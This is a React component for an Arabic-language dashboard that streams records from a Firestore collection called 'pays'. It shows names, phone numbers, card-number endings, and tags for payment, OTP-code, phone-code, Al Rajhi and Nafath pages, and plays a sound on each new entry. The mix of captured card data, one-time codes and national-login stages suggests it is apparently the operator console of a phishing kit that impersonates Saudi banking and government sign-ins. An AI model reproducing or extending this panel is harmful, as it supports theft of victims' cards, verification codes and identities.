"use client"

import { useState, useEffect, useRef } from "react"
import { format } from "date-fns"
import { collection, query, orderBy, onSnapshot } from "firebase/firestore"
import { db, Notification } from "@/lib/firebase"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  Loader2,
  RefreshCw,
  Search,
  XCircle,
  Bell,
  CheckCircle,
  Clock,
  CreditCard,
  FileText,
  Shield,
  Smartphone,
  Tag,
} from "lucide-react"
import { cn } from "@/lib/utils"

interface NotificationListProps {
  onSelectNotification: (notification: Notification) => void
  selectedId?: string
}

export function NotificationList({ onSelectNotification, selectedId }: NotificationListProps) {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const notificationSoundRef = useRef<HTMLAudioElement | null>(null)

  const playNotificationSound = () => {
    if (notificationSoundRef?.current) {
      notificationSoundRef!.current.currentTime = 0
      notificationSoundRef!.current!.play().catch((error) => {
        console.error("Error playing notification sound:", error)
      })
    }
  }

  useEffect(() => {
    fetchNotifications()
  }, [])

  useEffect(() => {
    if (searchTerm.trim() === "") {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        return (
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.card_number?.includes(searchTerm)
        )
      })
      setFilteredNotifications(filtered)
    }
  }, [searchTerm, notifications])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are new notifications
        if (notifications.length > 0 && notificationsData.length > notifications.length) {
          playNotificationSound()
        }

        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    const unsubscribe = fetchNotifications()
    setTimeout(() => {
      setIsRefreshing(false)
    }, 1000)
    return unsubscribe
  }

  const getPageType = (pagename?: string) => {
    let badge

    switch (pagename) {
      case "payment":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm">
            <CreditCard className="h-3 w-3 mr-1" /> دفع
          </Badge>
        )
        break
      case "home":
        badge = (
          <Badge
            variant="outline"
            className="bg-gradient-to-r from-violet-500 to-violet-600 text-white border-0 shadow-sm"
          >
            <FileText className="h-3 w-3 mr-1" /> تسجيل
          </Badge>
        )
        break
      case "verify-otp":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-pink-500 to-pink-600 text-white border-0 shadow-sm">
            <Shield className="h-3 w-3 mr-1" /> رمز OTP
          </Badge>
        )
        break
      case "verify-phone":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-rose-500 to-rose-600 text-white border-0 shadow-sm">
            <Smartphone className="h-3 w-3 mr-1" /> رمز هاتف
          </Badge>
        )
        break
      case "external-link":
        badge = (
          <Badge
            variant="outline"
            className="bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm"
          >
            <Tag className="h-3 w-3 mr-1" /> راجحي
          </Badge>
        )
        break
      case "nafaz":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm">
            <Shield className="h-3 w-3 mr-1" /> نفاذ
          </Badge>
        )
        break
      default:
        badge = (
          <Badge
            variant="outline"
            className="bg-gradient-to-r from-slate-500 to-slate-600 text-white border-0 shadow-sm"
          >
            <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
          </Badge>
        )
    }

    return badge
  }

  const getStatusIcon = (status?: string) => {
    if (!status || status === "pending") {
      return <Clock className="h-3.5 w-3.5 text-amber-500" />
    } else if (status === "approved") {
      return <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
    } else {
      return <XCircle className="h-3.5 w-3.5 text-rose-500" />
    }
  }

  if (isLoading) {
    return (
      <div className="flex items-center justify-center h-full">
        <Loader2 className="h-8 w-8 animate-spin text-slate-400" />
      </div>
    )
  }

  return (
    <div className="flex flex-col h-full">
      <div className="p-3 border-b border-slate-200 dark:border-slate-700">
        <div className="relative">
          <Search className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="بحث في الإشعارات..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pr-10"
          />
        </div>
        <div className="flex justify-between items-center mt-3">
          <span className="text-sm text-muted-foreground">{filteredNotifications.length} إشعار</span>
          <Button variant="ghost" size="sm" onClick={refreshData} disabled={isRefreshing} className="h-8 px-2">
            {isRefreshing ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <RefreshCw className="h-3.5 w-3.5" />}
            <span className="mr-1 text-xs">تحديث</span>
          </Button>
        </div>
      </div>

      <div className="flex-1">
        {filteredNotifications.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-64 text-center p-4">
            <Bell className="h-12 w-12 text-slate-300 mb-4" />
            <h3 className="text-lg font-medium mb-2">لا توجد إشعارات</h3>
            <p className="text-muted-foreground text-sm">
              {searchTerm ? "لا توجد نتائج مطابقة لمعايير البحث" : "ستظهر الإشعارات الجديدة هنا"}
            </p>
          </div>
        ) : (
          <div className="divide-y divide-slate-100 dark:divide-slate-800">
            {filteredNotifications.map((notification) => (
              <div
                key={notification.id}
                className={cn(
                  "p-3 cursor-pointer transition-colors hover:bg-slate-50 dark:hover:bg-slate-800/50",
                  selectedId === notification.id && "bg-slate-100 dark:bg-slate-800/70",
                )}
                onClick={() => onSelectNotification(notification)}
              >
                <div className="flex justify-between items-start mb-2">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-full bg-slate-100 dark:bg-slate-700 flex items-center justify-center">
                      {getStatusIcon(notification.status)}
                    </div>
                    <div>
                      <h4 className="text-sm font-medium line-clamp-1">
                        {notification.documment_owner_full_name || notification.document_owner_full_name || "غير محدد"}
                      </h4>
                      <p className="text-xs text-muted-foreground mt-0.5">
                        {notification.phone || "رقم الهاتف غير متوفر"}
                      </p>
                    </div>
                  </div>
                  <span className="text-xs text-muted-foreground">
                    {format(new Date(notification.createdDate), "HH:mm")}
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <div>{getPageType(notification.pagename)}</div>
                  {notification.card_number && (
                    <span className="text-xs font-mono text-muted-foreground">
                      *{notification.card_number.slice(-4)}
                    </span>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      <audio ref={notificationSoundRef} preload="auto">
        <source src="/notification.mp3" type="audio/mp3" />
      </audio>
    </div>
  )
}

